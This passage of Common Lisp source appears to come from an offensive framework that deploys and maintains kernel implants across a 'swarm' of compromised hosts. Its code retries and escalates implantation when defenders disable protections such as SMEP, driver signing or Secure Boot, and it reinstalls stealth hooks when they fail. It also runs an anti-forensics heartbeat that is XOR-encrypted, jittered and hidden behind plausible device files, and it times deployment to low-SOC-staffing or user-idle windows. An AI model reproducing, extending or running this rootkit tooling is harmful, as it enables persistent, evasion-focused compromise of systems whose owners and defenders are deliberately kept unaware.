  - Second retry: 600 seconds (10 minutes)
  - Third retry:  1200 seconds (20 minutes)
  - Subsequent:   capped at *KERNEL-MAX-RETRY-DELAY* (3600s = 1 hour)

The retry counter is stored in the agent's retry-count slot (inherited
from TACTICAL-AGENT). Each successful retry resets the counter.

Parameters:
  AGENT          -- KERNEL-AGENT instance to retry.
  :DELAY-SECONDS -- Integer, seconds to wait before retry (default 300).

Thread-safety: Thread-safe. Spawns a background thread for the delay.

Returns: The BT:THREAD handle of the retry thread.

Example:
  (retry-kernel-load my-agent :delay-seconds 600)"
  (let ((retry-count (tactical-retry-count agent)))
    (format *trace-output* "~&[KERNEL] Scheduling retry #~D for ~A in ~D seconds~%"
            (1+ retry-count) (kernel-target-host agent) delay-seconds)
    (bt:make-thread
     (lambda ()"
Wait for the delay, then attempt kernel load retry.

This lambda runs in a background thread. It sleeps for the delay
duration, then re-fingerprints the target and attempts a fresh
deployment. If deployment succeeds, the retry counter is reset."
       (sleep delay-seconds)
       (handler-case
           (progn
             ;; Re-fingerprint the target (protections may have changed)
             (let ((new-os (fingerprint-host-os (kernel-target-host agent))))
               (format *trace-output* "~&[KERNEL] Retry #~D for ~A: OS=~A~%"
                       (1+ retry-count) (kernel-target-host agent) new-os)
               (unless (eq new-os :unknown)
                 ;; Reset denied flag for retry
                 (setf (kernel-denied-p agent) nil)
                 ;; Increment retry counter
                 (incf (tactical-retry-count agent))
                 ;; Send new load request
                 (send-kernel-load-request agent new-os
                                           (kernel-target-pid agent)
                                           (kernel-implant-type agent)))))
         (error (e)
           (format *trace-output* "~&[KERNEL] Retry #~D failed for ~A: ~A~%"
                   (1+ retry-count) (kernel-target-host agent) e))))
     :name (format nil "kernel-retry-~A-~D"
                   (kernel-target-host agent)
                   (1+ retry-count)))))

(defun schedule-kernel-retry (agent base-delay)
  "Schedule a kernel retry with exponential backoff.

Calculates the actual delay based on the agent's retry count and
schedules the retry. The delay doubles with each retry attempt,
capped at *KERNEL-MAX-RETRY-DELAY*.

Parameters:
  AGENT      -- KERNEL-AGENT instance to schedule retry for.
  BASE-DELAY -- Integer, base delay in seconds.

Returns: The BT:THREAD handle of the retry thread.

Example:
  (schedule-kernel-retry my-agent 300)"
  (let* ((retry-count (tactical-retry-count agent))
         (delay (min (* base-delay (expt 2 retry-count))
                     *kernel-max-retry-delay*)))
    (retry-kernel-load agent :delay-seconds delay)))

(defun escalate-from-userland (agent)
  "Attempt to escalate from userland to kernel when conditions change.

This function is called when the swarm detects that kernel protections
may have been disabled (e.g., via a different vulnerability, or the
defender temporarily disabled a protection). It attempts to upgrade
from userland persistence to kernel implantation.

Escalation Checks:
  1. Is the host still in *KERNEL-HARDENED-HOSTS*?
  2. Has the retry-after time passed?
  3. Re-fingerprint: has the OS changed (dual-boot scenario)?
  4. Check if protections are still active (via Rust FFI)
  5. If protections are down, attempt kernel deployment

Parameters:
  AGENT -- KERNEL-AGENT instance to escalate.

Thread-safety: Thread-safe. Checks global hardened hosts registry.

Returns: T if escalation was attempted, NIL if conditions not met.

Example:
  (escalate-from-userland my-agent)"
  (let ((host (kernel-target-host agent)))
    (bt:with-lock-held (*kernel-hardened-lock*)
      (let ((hardened-info (gethash host *kernel-hardened-hosts*)))
        (when hardened-info
          ;; Check if retry time has passed
          (let ((retry-after (getf hardened-info :retry-after)))
            (when (local-time:timestamp< retry-after (local-time:now))
              (format *trace-output* "~&[KERNEL] Attempting escalation for ~A~%" host)
              ;; Re-fingerprint
              (let ((new-os (fingerprint-host-os host)))
                (when (and (not (eq new-os :unknown))
                           (not (eq new-os (kernel-target-os agent))))
                  (setf (kernel-target-os agent) new-os)))
              ;; Reset denied flag
              (setf (kernel-denied-p agent) nil)
              ;; Attempt deployment
              (send-kernel-load-request agent
                                        (kernel-target-os agent)
                                        (kernel-target-pid agent)
                                        (kernel-implant-type agent))
              t)))))))

(defun check-prerequisites (prerequisites os)
  "Check if kernel deployment prerequisites are met.

Validates a plist of prerequisites against the target OS. Returns a
list of missing prerequisites, or NIL if all are met.

Prerequisite Keywords:
  :SMEP-DISABLED     -- Supervisor Mode Execution Protection off
  :SMAP-DISABLED     -- Supervisor Mode Access Prevention off
  :DSE-DISABLED      -- Driver Signature Enforcement off (Windows)
  :SECURE-BOOT-OFF   -- UEFI Secure Boot disabled
  :SELINUX-PERMISSIVE -- SELinux in permissive mode (Linux)
  :APPARMOR-DISABLED  -- AppArmor disabled (Linux)
  :CAP-SYS-ADMIN      -- CAP_SYS_ADMIN capability available
  :ROOT-ACCESS        -- Root/Administrator access confirmed

Parameters:
  PREREQUISITES -- Plist of (:prereq t) pairs.
  OS            -- Keyword, target OS.

Returns: List of missing prerequisite keywords, or NIL if all met.

Example:
  (check-prerequisites '(:smep-disabled t :root-access t) :linux)
    ;; => (:SMEP-DISABLED)  -- if SMEP is still enabled"
  (let ((missing '()))
    (doplist (prereq required prerequisites)
      (when required
        (let ((met (case prereq
                     (:smep-disabled
                      (kernel-protection-disabled-p :smep os))
                     (:smap-disabled
                      (kernel-protection-disabled-p :smap os))
                     (:dse-disabled
                      (kernel-protection-disabled-p :dse os))
                     (:secure-boot-off
                      (kernel-protection-disabled-p :secure-boot os))
                     (:selinux-permissive
                      (kernel-protection-disabled-p :selinux os))
                     (:apparmor-disabled
                      (kernel-protection-disabled-p :apparmor os))
                     (:cap-sys-admin
                      (has-capability-p :sys-admin os))
                     (:root-access
                      (has-root-access-p os))
                     (otherwise
                      (format *trace-output* "~&[KERNEL] Unknown prerequisite: ~A~%"
                              prereq)
                      nil))))
          (unless met
            (push prereq missing)))))
    (reverse missing)))


;; ============================================================================
;; Section 6c: Ioctl-Based Heartbeat (Anti-Forensics)
;; ============================================================================
;; The traditional health monitor polls via /proc inspection, which is
;; visible to strace, auditd, and other system monitoring tools. The
;; ioctl-based heartbeat avoids this by communicating through a device
;; file using ioctl commands -- a pattern that blends with normal
;; system I/O and avoids the distinctive /proc access pattern.
;;
;; Key anti-forensics properties:
;;   - No /proc/<pid>/status reads (avoids auditd rules on /proc)
;;   - Randomized sleep intervals (50-70s) defeat timing correlation
;;   - Encrypted heartbeat payload (XOR with rotating key) prevents
;;     static signature detection on ioctl command content
;;   - Device handle is opened once and reused (minimizes open() syscalls)
;;
;; The rotating XOR key is derived from the implant-id, ensuring that
;; each agent's heartbeat payload is keyed uniquely without storing
;; additional secrets.

(defvar *kernel-heartbeat-device* "/dev/null"
  "Path to the device used for ioctl-based heartbeat communication.

In production, this should point to a legitimate-looking device that
can receive ioctl commands without raising suspicion. Good candidates:
  - /dev/ttyS0 through /dev/ttyS31  (serial ports, common on servers)
  - /dev/rtc0                        (real-time clock)
  - /dev/watchdog                    (hardware watchdog)
  - /dev/hwrng                       (hardware RNG)
  - /dev/net/tun                     (TUN/TAP device)

The device must exist and be openable. The ioctl commands sent are
harmless (they read status registers), so any device that supports
standard ioctl queries will work.

Default is /dev/null (fallback, no actual ioctl sent). Set this
before calling START-KERNEL-HEALTH-MONITOR for ioctl mode.")

(defvar *kernel-heartbeat-use-ioctl-p* t
  "Should the health monitor use the ioctl-based heartbeat path?

When T, START-KERNEL-HEALTH-MONITOR uses IOCTL-HEARTBEAT-WITH-JITTER
instead of the traditional /proc-polling health check. This provides
superior stealth at the cost of slightly less detailed health info.

When NIL, the traditional health monitor loop is used.

Default is T (prefer stealth). Set to NIL if detailed health status
is required for debugging or if no suitable device is available.")

(defun make-rotating-xor-key (implant-id &optional (iteration 0))
  "Derive a rotating XOR key from an implant ID.

The key is derived by combining the SXHASH of the implant-id with
the iteration counter, then mixing the bytes. This produces a unique
keying sequence per agent that rotates on each heartbeat iteration.

Parameters:
  IMPLANT-ID -- Symbol, the unique implant identifier.
  ITERATION  -- Integer, the heartbeat iteration counter (default 0).

Returns: Integer 0-255, the XOR key byte for this iteration.

Example:
  (make-rotating-xor-key 'IMPLANT-123 0)  ;; => 187"
  (let ((base (sxhash implant-id))
        (mix iteration))
    ;; Simple but effective key mixing
    (logand #xFF (logxor (+ base mix)
                         (ash base (- mix))
                         (ash base (logand mix 7))))))

(defun encrypt-heartbeat-payload (timestamp implant-id iteration)
  "Encrypt a heartbeat payload with a rotating XOR key.

The payload is a string representation of the timestamp, encrypted
byte-by-byte with the rotating key derived from IMPLANT-ID and
ITERATION. This prevents static signature detection on the ioctl
payload while remaining lightweight.

Parameters:
  TIMESTAMP  -- LOCAL-TIME:TIMESTAMP, the heartbeat timestamp.
  IMPLANT-ID -- Symbol, the implant identifier for key derivation.
  ITERATION  -- Integer, the heartbeat iteration counter.

Returns: String, the encrypted payload as hex-encoded bytes.

Example:
  (encrypt-heartbeat-payload (local-time:now) 'IMPLANT-123 5)"
  (let* ((ts-string (local-time:format-rfc3339-timestring nil timestamp))
         (encrypted '()))
    (dotimes (i (length ts-string))
      (let* ((key-byte (make-rotating-xor-key implant-id (+ iteration i)))
             (plain-byte (char-code (char ts-string i)))
             (cipher-byte (logxor plain-byte key-byte)))
        (push cipher-byte encrypted)))
    ;; Return as hex string
    (format nil "~{~2,'0X~}" (reverse encrypted))))

(defun decrypt-heartbeat-payload (hex-payload implant-id iteration)
  "Decrypt a heartbeat payload that was encrypted with encrypt-heartbeat-payload.

This is the inverse of ENCRYPT-HEARTBEAT-PAYLOAD. It takes the hex-encoded
encrypted payload and restores the original timestamp string.

Parameters:
  HEX-PAYLOAD -- String, the hex-encoded encrypted payload.
  IMPLANT-ID  -- Symbol, the implant identifier for key derivation.
  ITERATION   -- Integer, the heartbeat iteration counter.

Returns: String, the decrypted timestamp.

Example:
  (decrypt-heartbeat-payload "A1B2C3..." 'IMPLANT-123 5)"
  (let* ((len (length hex-payload))
         (decrypted '()))
    (do ((i 0 (+ i 2)))
        ((>= i len))
      (let* ((hex-byte (subseq hex-payload i (min (+ i 2) len)))
             (key-byte (make-rotating-xor-key
                        implant-id
                        (+ iteration (floor i 2))))
             (cipher-byte (parse-integer hex-byte :radix 16 :junk-allowed t))
             (plain-byte (logxor cipher-byte key-byte)))
        (when plain-byte
          (push (code-char plain-byte) decrypted))))
    (coerce (reverse decrypted) 'string)))

(defun open-heartbeat-device (device-path)
  "Open a device handle for ioctl-based heartbeat communication.

Opens the specified device file and returns a stream handle that
can be used for subsequent ioctl operations. The device is opened
in read-write mode to support both query and heartbeat commands.

Parameters:
  DEVICE-PATH -- String, path to the device file (e.g., "/dev/rtc0").

Returns: Stream handle, or NIL if the device could not be opened.

Error Handling: All errors are caught and logged. Returns NIL on failure
so the caller can fall back to the traditional health monitor.

Example:
  (open-heartbeat-device "/dev/rtc0")"
  (handler-case
      (open device-path
            :direction :io
            :if-exists :overwrite
            :if-does-not-exist nil
            :element-type '(unsigned-byte 8))
    (error (e)
      (format *trace-output* "~&[KERNEL] Cannot open heartbeat device ~A: ~A~%"
              device-path e)
      nil)))

(defun send-ioctl-heartbeat (device-stream implant-id iteration)
  "Send an ioctl-based heartbeat command to a device.

Constructs an encrypted heartbeat payload and sends it as an ioctl
command to the opened device stream. The payload includes the current
timestamp encrypted with a rotating key derived from IMPLANT-ID.

Parameters:
  DEVICE-STREAM -- Stream, the opened device handle.
  IMPLANT-ID    -- Symbol, the implant identifier.
  ITERATION     -- Integer, the heartbeat iteration counter.

Returns: T if the heartbeat was sent successfully, NIL otherwise.

Note: In stub mode (when the device is /dev/null or unavailable),
this function logs the operation and returns T without sending
actual ioctl commands."
  (handler-case
      (when device-stream
        (let* ((timestamp (local-time:now))
               (payload (encrypt-heartbeat-payload timestamp implant-id iteration)))
          ;; Write the encrypted payload to the device stream
          ;; In a real implementation, this would use CFFI to call ioctl()
          ;; For now, we write the payload bytes to the stream
          (let ((payload-bytes (map 'vector #'char-code payload)))
            (write-sequence payload-bytes device-stream)
            (force-output device-stream))
          (format *trace-output* "~&[KERNEL] Ioctl heartbeat sent (iter=~D, payload=~A...)~%"
                  iteration (subseq payload 0 (min 16 (length payload))))
          t))
    (error (e)
      (format *trace-output* "~&[KERNEL] Ioctl heartbeat error: ~A~%" e)
      nil)))

(defun ioctl-heartbeat-with-jitter (agent device-path &optional (iteration 0))
  "Perform a single ioctl-based heartbeat with randomized timing.

This is the core of the anti-forensics health monitor. It:
  1. Opens the heartbeat device (if not already open)
  2. Sends an encrypted heartbeat ioctl
  3. Performs a lightweight health check via Rust FFI
  4. Sleeps for a RANDOM interval between 50-70 seconds

The random sleep interval (computed as (+ 50 (RANDOM 21))) ensures
that the heartbeat timing is unpredictable, defeating:
  - Timing-based behavioral detection
  - Correlation analysis across multiple samples
  - Simple frequency-based filtering

Parameters:
  AGENT       -- KERNEL-AGENT to check, or NIL for global check.
  DEVICE-PATH -- String, path to the heartbeat device.
  ITERATION   -- Integer, current iteration counter.

Returns: The next iteration counter (+ 1).

Thread-safety: This function is called from the health monitor thread
only. It is not re-entrant.

Example:
  (ioctl-heartbeat-with-jitter my-agent "/dev/rtc0" 42)"
  (let ((device-stream nil)
        (next-iter (1+ iteration)))
    (unwind-protect
         (progn
           ;; Step 1: Open device
           (setf device-stream (open-heartbeat-device device-path))
           (when device-stream
             ;; Step 2: Send heartbeat ioctl
             (let* ((implant-id (when agent
                                  (kernel-implant-id agent)))
                    (id-to-use (or implant-id 'global-check)))
               (send-ioctl-heartbeat device-stream id-to-use iteration))
             ;; Step 3: Lightweight health check
             (when agent
               (kernel-health-check agent))
             ;; Step 4: Sleep with jitter
             (let ((sleep-seconds (+ 50 (random 21))))
               (format *trace-output* "~&[KERNEL] Heartbeat sleeping ~Ds (jittered)~%"
                       sleep-seconds)
               (sleep sleep-seconds))))
      ;; Cleanup: Always close the device
      (when device-stream
        (handler-case (close device-stream)
          (error (e)
            (format *trace-output* "~&[KERNEL] Error closing heartbeat device: ~A~%" e)))))
    next-iter))

(defun ioctl-health-monitor-loop (agent device-path)
  "The ioctl-based health monitor main loop.

Replaces the traditional /proc-polling loop with an ioctl-based
heartbeat that has superior anti-forensics properties. Runs until
*KERNEL-HEALTH-MONITOR-RUNNING-P* is set to NIL.

This loop:
  1. Calls IOCTL-HEARTBEAT-WITH-JITTER for each iteration
  2. Handles all errors gracefully (never crashes)
  3. Closes device handles on exit (no resource leaks)
  4. Publishes status to gossip mesh

Parameters:
  AGENT       -- KERNEL-AGENT to monitor, or NIL for all agents.
  DEVICE-PATH -- String, path to the heartbeat device.

Returns: NIL (loops until stopped)."
  (format *trace-output* "~&[KERNEL] Ioctl health monitor started (device=~A)~%"
          device-path)
  (let ((iteration 0))
    (loop
      while *kernel-health-monitor-running-p*
      do
         (handler-case
             (progn
               ;; For global monitoring, iterate all agents
               (if agent
                   ;; Single agent mode
                   (setf iteration
                         (ioctl-heartbeat-with-jitter
                          agent device-path iteration))
                   ;; Global mode: heartbeat + check all agents
                   (progn
                     (setf iteration
                           (ioctl-heartbeat-with-jitter
                            nil device-path iteration))
                     ;; Check all registered agents
                     (let ((agents-to-check '()))
                       (bt:with-lock-held (*kernel-registry-lock*)
                         (maphash (lambda (id a)
                                    (declare (ignore id))
                                    (when (and (typep a 'kernel-agent)
                                               (kernel-implant-id a))
                                      (push a agents-to-check)))
                                  *kernel-implant-registry*))
                       (dolist (a agents-to-check)
                         (kernel-health-check a))))))
           (error (e)
             (format *trace-output* "~&[KERNEL] Ioctl health monitor error: ~A~%" e)
             ;; On error, sleep briefly and retry
             (sleep 5)))
         ;; Publish periodic status
         (when (zerop (mod iteration 10))
           (gossip-publish *kernel-telemetry-topic*
                           `(:event :ioctl-heartbeat-status
                             :iteration ,iteration
                             :device ,device-path
                             :timestamp ,(local-time:now))))))
  ;; Cleanup on exit
  (format *trace-output* "~&[KERNEL] Ioctl health monitor stopped~%"))

;; ============================================================================
;; Section 7: Health Monitoring
;; ============================================================================
;; The health monitor is a background thread that periodically checks
;; all registered kernel implants. It verifies hook integrity, implant
;; responsiveness, and system stability. If problems are detected, it
;; signals the Recovery Manager and publishes alerts to the gossip mesh.
;;
;; Health Check Flow:
;;   1. Iterate over all registered kernel implants
;;   2. For each implant, call Rust FFI check_health()
;;   3. Verify all registered hooks (byte-level integrity)
;;   4. If corrupt/missing hooks found -> signal Recovery Manager
;;   5. Publish health summary to gossip mesh
;;   6. Sleep until next interval

(defun start-kernel-health-monitor (&optional (agent nil) (interval 10))
  "Start the kernel health monitor background thread.

If AGENT is provided, the monitor checks only that agent's implant.
If AGENT is NIL, the monitor checks ALL registered implants globally.

The monitor uses the ioctl-based heartbeat path by default (when
*KERNEL-HEARTBEAT-USE-IOCTL-P* is T and a valid device is available).
This provides superior stealth via jittered timing and encrypted payloads.
If the ioctl path is unavailable, it falls back to the traditional
/proc-polling loop with a warning.

Parameters:
  AGENT    -- Optional KERNEL-AGENT to monitor, or NIL for all agents.
  INTERVAL -- Integer, seconds between health checks (default 10).
              Only used by the traditional (non-ioctl) path.

Thread-safety: Thread-safe. Creates a new background thread.

Returns: The BT:THREAD handle of the monitor thread.

Example:
  (start-kernel-health-monitor my-agent 30)    ; Monitor single agent
  (start-kernel-health-monitor nil 60)         ; Monitor all agents"
  (unless *kernel-health-monitor-running-p*
    (setf *kernel-health-monitor-running-p* t)
    ;; Determine which path to use: ioctl (stealthy) or traditional
    (let ((use-ioctl
            (and *kernel-heartbeat-use-ioctl-p*
                 (probe-file *kernel-heartbeat-device*)
                 (not (string= *kernel-heartbeat-device* "/dev/null")))))
      (if use-ioctl
          ;; Ioctl-based heartbeat path (stealthy)
          (let ((thread
                 (bt:make-thread
                  (lambda ()
                    (ioctl-health-monitor-loop agent *kernel-heartbeat-device*))
                  :name "kernel-health-monitor-ioctl")))
            (setf *kernel-health-monitor-thread* thread)
            (format *trace-output* "~&[KERNEL] Health monitor started (ioctl path, device=~A)~%"
                    *kernel-heartbeat-device*)
            thread)
          ;; Traditional path (fallback)
          (progn
            (format *trace-output* "~&[KERNEL] WARNING: Using traditional health monitor. ~
                    Ioctl path unavailable (device=~A). Consider setting ~
                    *KERNEL-HEARTBEAT-DEVICE* to a valid device.~%"
                    *kernel-heartbeat-device*)
            (let ((thread
                   (bt:make-thread
                    (lambda ()"
Kernel health monitor main loop.

Runs until *KERNEL-HEALTH-MONITOR-RUNNING-P* is set to NIL.
Each iteration:
  1. Determine which agents to check
  2. Call KERNEL-HEALTH-CHECK for each
  3. Publish summary to gossip mesh
  4. Sleep for INTERVAL seconds"
              (loop
                while *kernel-health-monitor-running-p*
                do
                   (handler-case
                       (let ((agents-to-check
                               (if agent
                                   (list agent)
                                   (let ((agents '()))
                                     (bt:with-lock-held (*kernel-registry-lock*)
                                       (maphash (lambda (id agent)
                                                  (declare (ignore id))
                                                  (when (and (typep agent 'kernel-agent)
                                                             (kernel-implant-id agent))
                                                    (push agent agents)))
                                                *kernel-implant-registry*))
                                     agents))))
                         (dolist (a agents-to-check)
                           (kernel-health-check a)))
                     (error (e)
                       (format *trace-output* "~&[KERNEL] Health monitor error: ~A~%" e)))
                   (sleep interval)))
            :name "kernel-health-monitor")))
      (setf *kernel-health-monitor-thread* thread)
      (format *trace-output* "~&[KERNEL] Health monitor started (interval=~Ds)~%"
              interval)
      thread)))))

(defun kernel-health-check (agent)
  "Check the health of a kernel agent's implant.

This function performs a comprehensive health check on a single agent's
kernel implant. It combines Rust FFI health checks with hook integrity
verification.

Health Check Steps:
  1. Verify the agent has an active implant
  2. Call Rust FFI check_health(implant_id) for low-level checks
  3. Call VERIFY-ALL-HOOKS for byte-level integrity
  4. Aggregate results into health status
  5. Update agent's health-status and last-health-check slots
  6. If degraded/critical, signal Recovery Manager and publish alert
  7. Publish health summary to gossip mesh

Parameters:
  AGENT -- KERNEL-AGENT instance to check.

Thread-safety: Thread-safe. Reads agent slots, does not modify other agents.

Returns: Plist with health status:
  :STATUS       -- :HEALTHY :DEGRADED :CRITICAL :UNKNOWN
  :IMPLANT-ID   -- The implant ID checked
  :HOOK-SUMMARY -- Result of VERIFY-ALL-HOOKS
  :FFI-RESULT   -- Result of Rust FFI check

Example:
  (kernel-health-check my-agent)"
  (let ((implant-id (kernel-implant-id agent)))
    (if (null implant-id)
        (progn
          (setf (kernel-health-status agent) :unknown)
          (list :status :unknown
                :implant-id nil
                :hook-summary nil
                :ffi-result nil))
        (let ((ffi-result nil)
              (hook-summary nil)
              (new-status :unknown))
          ;; Step 1: Rust FFI health check
          (handler-case
              (setf ffi-result
                    (check-implant-health-via-ffi implant-id
                                                  (kernel-target-host agent)))
            (error (e)
              (format *trace-output* "~&[KERNEL] FFI health check error for ~A: ~A~%"
                      implant-id e)
              (setf ffi-result `(:error ,(princ-to-string e)))))
          ;; Step 2: Hook integrity verification
          (handler-case
              (setf hook-summary (verify-all-hooks agent))
            (error (e)
              (format *trace-output* "~&[KERNEL] Hook verification error for ~A: ~A~%"
                      implant-id e)
              (setf hook-summary `(:error ,(princ-to-string e)))))
          ;; Step 3: Aggregate health status
          (setf new-status
                (cond
                  ;; FFI error or critical hook failure
                  ((or (getf ffi-result :error)
                       (and (plistp hook-summary)
                            (> (getf hook-summary :missing 0) 0)))
                   :critical)
                  ;; Some hooks corrupt but implant functional
                  ((and (plistp hook-summary)
                        (> (getf hook-summary :corrupt 0) 0))
                   :degraded)
                  ;; FFI reports degraded
                  ((eq (getf ffi-result :status) :degraded)
                   :degraded)
                  ;; Everything looks good
                  ((and (plistp hook-summary)
                        (= (getf hook-summary :corrupt 0) 0)
                        (= (getf hook-summary :missing 0) 0))
                   :healthy)
                  ;; Default: unknown
                  (t :unknown)))
          ;; Step 4: Update agent state
          (setf (kernel-health-status agent) new-status
                (kernel-last-health-check agent) (local-time:now))
          ;; Step 5: Signal Recovery Manager if needed
          (when (eq new-status :critical)
            (gossip-publish *kernel-telemetry-topic*
                            `(:event :kernel-implant-critical
                              :agent ,(kernel-session-token agent)
                              :implant-id ,implant-id
                              :host ,(kernel-target-host agent)
                              :ffi-result ,ffi-result
                              :hook-summary ,hook-summary))
            ;; Attempt automatic recovery
            (handler-case
                (recover-kernel-implant agent)
              (error (e)
                (format *trace-output* "~&[KERNEL] Auto-recovery failed for ~A: ~A~%"
                        implant-id e))))
          ;; Step 6: Publish health summary
          (when (or (eq new-status :degraded) (eq new-status :healthy))
            (gossip-publish *kernel-telemetry-topic*
                            `(:event :kernel-health-check
                              :agent ,(kernel-session-token agent)
                              :implant-id ,implant-id
                              :status ,new-status
                              :hooks ,(when (plistp hook-summary)
                                        (getf hook-summary :total 0)))))
          ;; Return result
          (list :status new-status
                :implant-id implant-id
                :hook-summary hook-summary
                :ffi-result ffi-result)))))

(defun stop-kernel-health-monitor ()"
Stop the kernel health monitor background thread.

Signals the monitor thread to stop gracefully and waits for it to
terminate. The thread will finish its current iteration and exit.

Thread-safety: Thread-safe. Sets a flag that the monitor checks.

Returns: T if the monitor was stopped, NIL if it was not running.

Example:
  (stop-kernel-health-monitor)"
  (when *kernel-health-monitor-running-p*
    (setf *kernel-health-monitor-running-p* nil)
    (when *kernel-health-monitor-thread*
      (bt:join-thread *kernel-health-monitor-thread* :timeout 5)
      (setf *kernel-health-monitor-thread* nil))
    (format *trace-output* "~&[KERNEL] Health monitor stopped~%")
    t))

(defun recover-kernel-implant (agent)
  "Attempt to recover a critically unhealthy kernel implant.

This function is called automatically when KERNEL-HEALTH-CHECK detects
a critical condition. It attempts to restore the implant by:

Recovery Steps:
  1. Re-verify all hooks (double-check the critical status)
  2. Remove corrupt hooks and re-install them
  3. If implant is non-responsive, remove and re-deploy
  4. Update agent state and publish recovery result

Parameters:
  AGENT -- KERNEL-AGENT instance with critical implant.

Thread-safety: Thread-safe. Only modifies the given agent.

Returns: T if recovery succeeded, NIL if recovery failed.

Example:
  (recover-kernel-implant my-agent)"
  (format *trace-output* "~&[KERNEL] Attempting recovery for ~A on ~A~%"
          (kernel-implant-id agent) (kernel-target-host agent))
  (handler-case
      (let ((agent-id (kernel-session-token agent))
            (host (kernel-target-host agent)))
        ;; Step 1: Remove all corrupt/missing hooks
        (let ((hooks-to-remove '()))
          (maphash (lambda (hook-id hook)
                     (when (member (stealth-hook-health-status hook)
                                   '(:corrupt :missing))
                       (push hook-id hooks-to-remove)))
                   (kernel-stealth-state agent))
          ;; Remove corrupt hooks
          (dolist (hook-id hooks-to-remove)
            (remove-stealth-hook agent hook-id)))
        ;; Step 2: Attempt re-deployment
        (let ((new-implant-id
               (deploy-implant-via-ffi
                (lookup-kernel-tool
                 (select-kernel-tool (kernel-target-os agent)
                                     (kernel-implant-type agent)
                                     (calculate-target-value
                                      (kernel-target-info agent))))
                host
                (kernel-target-pid agent))))
          (if new-implant-id
              (progn
                (setf (kernel-implant-id agent) (gensym "RECOVERED-")
                      (kernel-health-status agent) :recovered
                      (kernel-last-health-check agent) (local-time:now))
                (gossip-publish *kernel-telemetry-topic*
                                `(:event :kernel-implant-recovered
                                  :agent ,agent-id
                                  :host ,host))
                t)
              (progn
                (format *trace-output* "~&[KERNEL] Recovery failed for ~A~%" host)
                (setf (kernel-health-status agent) :critical)
                (gossip-publish *kernel-telemetry-topic*
                                `(:event :kernel-recovery-failed
                                  :agent ,agent-id
                                  :host ,host))
                nil))))
    (error (e)
      (format *trace-output* "~&[KERNEL] Recovery exception for ~A: ~A~%"
              (kernel-target-host agent) e)
      nil)))


;; ============================================================================
;; Section 7c: Quiet-Window Deployment Controls
;; ============================================================================
;; Controlled deployment windows minimize audit events by restricting
;; implant deployment to times when SOC staffing is minimal and
;; automated log analysis is least likely to flag the activity.
;;
;; The quiet window system checks three conditions:
;;   1. Current time is within allowed windows (hour, weekday)
;;   2. System is in early boot (noisy period, blends with normal boot activity)
;;   3. GUI has been idle for > 10 minutes (user not present)
;;
;; If outside the quiet window, deployment is queued and deferred
;; until the window opens, rather than failing or forcing immediate
;; deployment (which would be noisy and detectable).

(defun system-boot-time-seconds ()
  "Return the number of seconds since system boot.

Reads /proc/uptime on Linux to determine how long the system has
been running. This is used by QUIET-WINDOW-ACTIVE-P to determine
if we are in the early-boot grace period.

Returns: Integer, seconds since boot, or 0 if cannot determine.

Example:
  (system-boot-time-seconds)  ;; => 1847 (system booted 30 min ago)"
  (handler-case
      (with-open-file (stream "/proc/uptime" :direction :input)
        (let ((line (read-line stream nil nil)))
          (when line
            (let ((space-pos (position #\space line)))
              (if space-pos
                  (floor (parse-float (subseq line 0 space-pos)))
                  0)))))
    (error (e)
      (format *trace-output* "~&[KERNEL] Could not read boot time: ~A~%" e)
      0)))

(defun parse-float (string)
  "Parse a floating-point number from a string.

Simple helper that converts a string representation of a float
to a Lisp float. Uses READ-FROM-STRING with safety checks.

Parameters:
  STRING -- String containing a floating-point number.

Returns: The float value, or 0.0 if parsing fails."
  (handler-case
      (let ((*read-eval* nil))
        (read-from-string string))
    (error () 0.0)))

(defun gui-idle-time-minutes ()
  "Return the number of minutes since last GUI activity.

Attempts to query the X11 idle time via xprintidle. If X11 is not
available or xprintidle is not installed, returns a conservative
estimate of 0 (not idle).

This is used by QUIET-WINDOW-ACTIVE-P to determine if the user
is likely away from the system.

Returns: Integer, minutes of GUI idle time, or 0 if cannot determine.

Example:
  (gui-idle-time-minutes)  ;; => 15 (user idle for 15 minutes)"
  (handler-case
      (let ((output (uiop:run-program
                     "xprintidle 2>/dev/null || echo 0"
                     :output :string
                     :ignore-error-status t)))
        (let* ((*read-eval* nil)
               (millis (read-from-string
                        (string-trim '(#
ewline #\return #\tab #\space) output))))
          (floor millis 60000)))  ; Convert ms to minutes
    (error (e)
      (format *trace-output* "~&[KERNEL] Could not query GUI idle time: ~A~%" e)
      0)))

(defun current-hour-utc ()
  "Return the current hour in UTC (0-23).

Uses DECODE-UNIVERSAL-TIME to get the current hour. This is used
by QUIET-WINDOW-ACTIVE-P to check if the current time is within
allowed deployment hours.

Returns: Integer 0-23."
  (multiple-value-bind (sec min hour)
      (decode-universal-time (get-universal-time) 0)
    (declare (ignore sec min))
    hour))

(defun quiet-window-active-p ()
  "Check if the current time is within an allowed deployment window.

This function evaluates all configured quiet windows from
*KERNEL-QUIET-WINDOWS* and returns T if ANY window is active.

Window types evaluated:
  :BOOT   -- Active if system boot time < 5 minutes
  :HOUR   -- Active if current UTC hour is in the allowed list
  :WEEKDAY -- Active if today is in the allowed weekday list
  :IDLE   -- Active if GUI idle time >= N minutes

If *KERNEL-QUIET-WINDOWS* is NIL, always returns T (no restrictions).

Returns: T if deployment is allowed, NIL if it should be deferred.

Example:
  (quiet-window-active-p)  ;; => T (within allowed window)"
  (if (null *kernel-quiet-windows*)
      t  ; No restrictions
      (let ((boot-seconds (system-boot-time-seconds))
            (current-hour (current-hour-utc))
            (idle-minutes (gui-idle-time-minutes))
            (active nil))
        (dolist (window *kernel-quiet-windows*)
          (when (null active)  ; Stop checking once we find an active window
            (let ((type (car window))
                  (spec (cdr window)))
              (case type
                (:boot
                 ;; Early boot: always noisy, good time to blend in
                 (when (and spec (< boot-seconds 300))
                   (setf active t)))
                (:hour
                 ;; Check if current hour is in allowed list
                 (when (and (listp spec)
                            (member current-hour spec))
                   (setf active t)))
                (:weekday
                 ;; Check if today is in allowed weekday list
                 (let ((today (nth-value 6 (decode-universal-time
                                            (get-universal-time) 0))))
                   (when (and (listp spec)
                              (member today spec))
                     (setf active t))))
                (:idle
                 ;; Check if GUI has been idle for >= N minutes
                 (when (and (numberp spec)
                            (>= idle-minutes spec))
                   (setf active t)))
                (otherwise
                 (format *trace-output*
                         "~&[KERNEL] Unknown quiet window type: ~A~%"
                         type))))))
        active)))

(defun enqueue-implant-deployment (target &key implant-type target-pid noise-level)
  "Add an implant deployment to the deferred queue.

Creates a queued deployment entry and pushes it onto
*KERNEL-IMPLANT-QUEUE*. The deployment will be processed later
when a quiet window opens (via PROCESS-IMPLANT-QUEUE).

Parameters:
  TARGET       -- String, target host.
